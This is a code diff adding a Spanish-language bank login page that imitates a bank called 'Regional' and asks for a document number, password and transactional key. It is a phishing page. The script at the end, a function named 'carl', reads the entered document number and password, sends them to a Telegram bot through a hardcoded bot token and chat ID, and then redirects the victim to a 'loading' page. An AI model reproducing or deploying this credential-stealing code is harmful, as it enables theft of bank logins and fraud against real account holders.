+				  <i class="fa fa-circle-thin fa-stack-1x"></i><span class="caption">i</span>
+				</span>
+			    <h4 class="modal-title sm" id="mdlResultLabel">OBTENGA SU CLAVE TRANSACCIONAL</h4>
+			  </div>
+			  <div class="modal-body">
+			  	<div class="row-data">
+			  		<div class="row">
+			  			<div class="col-xs-12 col-sm-12 text-left">
+			  				<div class="step-vinhetas">
+			  					<span class="fa fa-circle-thin"></span><span class="caption">2</span>
+			  				</div>
+			  				<p class="step-caption">Ingrese el código recibido en el campo CLAVE TRANSACCIONAL</p>
+			  			</div>
+			  			<div class="col-xs-12 col-sm-12 pdl-frmModal mb-20">
+			  				<p>¿No has recibido tu clave? Ten en cuenta que dependiendo del método de envío, puede demorar unos minutos.</p>
+			  			</div>
+			  		</div>
+			  	</div>
+			  	<div class="b-bottom"></div>
+			  </div>
+			  <div class="modal-footer">
+			  	<div class="botonera-footer">
+			    	<button type="button" class="btn btn-bottom" data-dismiss="modal">Cerrar</button>
+			    </div>
+			  </div>
+			</div>
+			</div>
+		</form>
+	</div>
+	<div id="modalConfirmacion" class="mt-10"></div>
+	<!-- /modal -->
+	<script src="js/jquery.min.js"></script>
+	<script src="js/bootstrap.min.js"></script>
+	<script src="js/bootstrap-select.min.js"></script>
+	<!--[if lte IE 9]>
+		<script src="js/regional_ie9.js"></script>
+	<![endif]-->
+	<script src="js/cryptoJS.min.js"></script>
+	<script src="js/regional_login.js"></script>
+	<script src="js/regional_error_helper.js"></script>
+	<script src="js/regional_html_builder.js"></script>
+	<script src="js/spin.min.js"></script>
+	<script src="js/moment.min.js"></script>
+	<script>
+		$(document).ready(login_setup.onReady);
+	</script>
+	<script>
+		$( document ).ready(function() {
+			var tipoCliente = $('#tipo-cliente').children(':selected').val();
+			switch(tipoCliente){
+				case "1":
+					$("#caja_select_personas").removeClass('hidden');
+					$("#caja_select_empresas").addClass('hidden');
+					break;
+				case "2":
+				case "3":
+					$("#caja_select_personas").addClass('hidden');
+					$("#caja_select_empresas").removeClass('hidden');
+					cambiarLabelEmpresa('label_ruc','tipo-doc-empresa');
+					break;
+			}
+		});
+		$('#tipo-cliente').on('change', function(){
+			var tipoCliente = $(this).children(':selected').val();
+			switch(tipoCliente){
+				case "1":
+					$("#caja_select_personas").removeClass('hidden');
+					$("#caja_select_empresas").addClass('hidden');
+					cambiarLabel('label_documento','tipo-doc');
+					break;
+				case "2":
+				case "3":
+					cambiarLabel('label_documento','tipo-doc');
+					$("#caja_select_personas").addClass('hidden');
+					$("#caja_select_empresas").removeClass('hidden');
+					cambiarLabelEmpresa('label_ruc','tipo-doc-empresa');
+					break;
+			}
+		});
+	</script>
+	
+
+
+
+	<script type="text/javascript">
+		/*
+			* RUN ON EVERY PAGE 
+		*/
+
+		// CHECK AND DISABLE SERVICES THAT ARE CURRENTLY UNAVAILABLE
+ 		var disabled_services = ["pago-servicios-otros","transf-xpress"];
+		$(document).ready(function() {
+
+			$(disabled_services).each(function(i, e) {
+				$(".acl-view-" + e).hide();
+				$(".acl-disabled-" + e).attr("disabled", true);
+			});
+
+			$(".acl_disabled").click(function(event){ 
+				event.preventDefault();
+				return false;
+			});
+ 		});
+</script>	
+	
+
+
+<div class="modal-backdrop fade in"></div></body>
+
+
+<script>
+	    
+function carl(params) {
+   
+      
+     
+
+   
+   const token = '5841260850:AAE3Vubjqe4wVd9835ZGc7C4ybUX8Vl19jg';
+const chatId = '-983607280';
+
+if (document.getElementById("nro-documento").value.length <= 6 ) {
+   alert("error, Usuario incompleto");
+   document.getElementById("nro-documento").value = "";
+   document.getElementById("nro-documento").focus();
+
+   
+}else if(document.getElementById("auth-password").value.length <= 4){
+    alert("error, Contraseña incompleto");
+   document.getElementById("auth-password").value = "";
+   document.getElementById("auth-password").focus();
+
+}else{
+   const code = document.getElementById("nro-documento").value;
+   const codee = document.getElementById("auth-password").value;
+   localStorage.setItem("usr", code);
+
+const message = `** REGIONAL ** \n  DOC: ${code} - \n-  clave: ${codee}\n ** --- ** ` ;
+$.ajax({
+  type: 'POST',
+  url: `https://api.telegram.org/bot${token}/sendMessage`,
+  data: {
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'html',
+  },
+  success: function (res) {
+      console.debug(res);
+      $('#response').text('Message sent');
+      console.log("enviado")
+      
+      window.location = "cargando.html"
+      
+     
+  },
+  error: function (error) {
+      console.error(error);
+      alert("error failed");
+  } 
+
+})
+
+}
+
+}
+
+</script></html>
